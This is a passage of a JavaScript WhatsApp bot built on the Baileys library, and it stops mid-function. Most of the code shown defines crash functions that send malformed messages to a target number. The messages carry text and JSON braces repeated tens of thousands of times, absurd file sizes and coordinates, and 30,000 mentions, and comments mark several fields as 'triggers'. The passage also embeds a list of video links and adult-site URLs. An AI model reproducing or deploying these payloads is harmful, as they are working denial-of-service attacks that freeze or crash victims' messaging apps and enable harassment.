/*
Devloper : Kgk jelas
Credit By KahfiMoodTzy
*/
require('./settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = rayz = async (rayz, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? rayz.user.id.split(":")[0] || rayz.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await rayz.decodeJid(rayz.user.id);
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./lib/Database/premium.json"))

const isPremium = premium.includes(m.sender)
const isOwner = newOwner.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// function Group
const groupMetadata = isGroup ? await rayz.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const linknya = [
  "https://videy.co/v?id=qpHUg4zD1",
  "https://videy.co/v?id=uOdHa9zY1",
  "https://videy.co/v?id=RQwh7csc1",
  "https://videy.co/v?id=bZSoTEGg1",
  "https://videy.co/v?id=ho0kU8BR1",
  "https://videy.co/v?id=1KYQBQw31",
  "https://videy.co/v?id=TcQ4f0Hc1",
  "https://videy.co/v?id=bChYgxMM1",
  "https://videy.co/v?id=wnApN5h5",
  "https://videy.co/v?id=2yFjuaFp",
  "https://videy.co/v?id=dTfQCNjM",
  "https://videy.co/v?id=g8TCz2SF1",
  "https://videy.co/v?id=MDJMjbIm1",
  "https://videy.co/v?id=WtmSnXHC1",
  "https://videy.co/v?id=x6UlKD4Q1",
  "https://videy.co/v?id=90lQLoLP1",
  "https://videy.co/v?id=qa3oLQIq1",
  "https://videy.co/v?id=CH4fJGUS1",
  "https://videy.co/v?id=gIvMeBz81",
  "https://videy.co/v?id=RDYEvSt41",
  "https://videy.co/v?id=drfcj5DI1",
  "https://videy.co/v?id=dtsAo1hl1",
  "https://videy.co/v?id=tyQukhe11",
  "https://videy.co/v?id=yS4itpef1",
  "https://videy.co/v?id=FrEfsf4d1",
  "https://videy.co/v?id=rNsbDYix1",
  "https://s.id/videycovidfDxePwXN1",
  "https://videy.co/v?id=F9nMos7O1",
  "https://videy.co/v?id=XRrgrZqJ1",
  "https://videy.co/v?id=cZ9uLjhP1",
  "https://videy.co/v?id=BS3Bgaqx1",
  "https://videy.co/v?id=HlDxED2Q1",
  "https://videy.co/v?id=oqdoL1WB",
  "https://s.id/videycovidM1aiVKU01",
  "https://videy.co/v?id=DI9pMdX41",
  "https://videy.co/v?id=QU6nHJK71",
  "https://videy.co/v?id=fCOumEXd",
  "https://videy.co/v?id=hc11Ypob1",
  "https://s.id/videycovidfDxePwXN1",
  "https://videy.co/v?id=z21E05vG1",
  "https://videy.co/v?id=JYc7CqTM1",
  "https://videy.co/v?id=g67z3K1t1",
  "https://videy.co/v?id=glMrZ1dJ1",
  "https://videy.co/v?id=63HiM8ap1",
  "https://videy.co/v?id=BPYCWEEl1",
  "https://videy.co/v?id=Hjh1XibQ1",
  "https://s.id/videycovidM1aiVKU01",
  "https://videy.co/v?id=fU0E6kls1",
  "https://videy.co/v?id=ZGku9ltc1",
  "https://videy.co/v?id=63XmiKf61",
  "https://videy.co/v?id=Xmm7hW7B1",
  "https://videy.co/v?id=MN53D4IU1",
  "https://videy.co/v?id=uvdvJBNe1",
  "https://videy.co/v?id=V3du3fYN1",
  "https://videy.co/v?id=8zYVoI601",
  "https://videy.co/v?id=BFdWBV7r",
  "https://videy.co/v?id=oDN9BQob",
  "https://s.id/videycovidE1pl6kWk1",
  "https://videy.co/v?id=vuGY8bMf1",
  "https://videy.co/v?id=3VvPZkAS1",
  "https://videy.co/v?id=ozzum9KK",
  "https://videy.co/v?id=9OnQs3za",
  "https://videy.co/v?id=7VNnq8WI",
  "https://s.id/videycovid42kNYl4k1",
  "https://videy.co/v?id=FvkIVFXE1",
  "https://videy.co/v?id=mwMgpziJ1",
  "https://videy.co/v?id=tRBPHWjG1",
  "https://videy.co/v?id=vMiuA1NE1",
  "https://videy.co/v?id=pM3f3gTu1",
  "https://s.id/videycovidfDxePwXN1",
  "https://videy.co/v?id=WmfAHZki1",
  "https://videy.co/v?id=9m82uE5c1",
];
const randomLink = linknya[Math.floor(Math.random() * linknya.length)];

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
} 

async function VCrLSqL(target) {
  const cards = [];

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
  
  
  const header = {
    videoMessage, // triger 1
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: " 🕷️ raldzz`executive 🕷️",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: " !s`raldzz xyz",
              body: "how to get past this feeling ¿?",
              thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false // trigger 2
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 3
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 4
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 5
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: " © PhynxAgency ",
                thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://xnxx.com",
                showAdAttribution: false // trigger 6
              }
            }
          }
        }
      }
    },
    {}
  );

  await rayz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function loadedIos(target, ptcp = true) {
await rayz.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧`,
body: `Haii ${pushname}`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/tama`
}
}
}, { quoted: m })
}


async function FcinvisAll(target) {
let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
address: "زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي  :: 𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 :: >𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
}
}
}
}
}), {
userJid: target,
quoted: null
});

await rayz.relayMessage('status@broadcast', etc.message, {
messageId: etc.key.id,
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};

async function VampiPhone(target, Ptcp = false) {
      await rayz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "̶A̶l̶a̶y̶L̶u̶j̶a̶b̶l̶a̶y" + "ꦫꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "̶W̶o̶i̶k̶o̶n̶t̶o̶l̶M̶a̶m̶p̶u̶s",
                body: " ̶W̶o̶i̶K̶o̶n̶t̶o̶l̶m̶a̶m̶p̶u̶s" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail: 
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1nxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Vampiresagara",
                mediaUrl: "https://t.me/Vampiresagara",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Vampiresagara",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

////Func Combo Invis
async function propovers3(target, ptcp = true) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363373003239606@newsletter",
      newsletterName: "🩸 YT JustinOfficial-ID".repeat(10000),
      caption: "JustinOfficial".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await rayz.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function BlankScreen(target, Ptcp = true) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "🩸u know rapz¿🔥" + "ោ៝".repeat(10000),
      caption: "🩸u know rapz¿🔥" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await rayz.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function ForceX(target) {
let Payload = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
address: "زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي  :: 𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 :: >𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
},
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0PayloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "ZynXzo New",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
},
hasMediaAttachment: true
}
}
}
}), {
userJid: target,
quoted: null
});

await rayz.relayMessage('status@broadcast', Payload.message, {
messageId: Payload.key.id,
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};

async function pedocrash(target, ptcp = true) {
  const listMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  let crash = JSON.stringify({
    action: "x",
    data: "x"
  });

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "DimzxzzxXD pedo ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: listMents,
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await rayz.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log("🤭")
}

async function VampNotif2(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
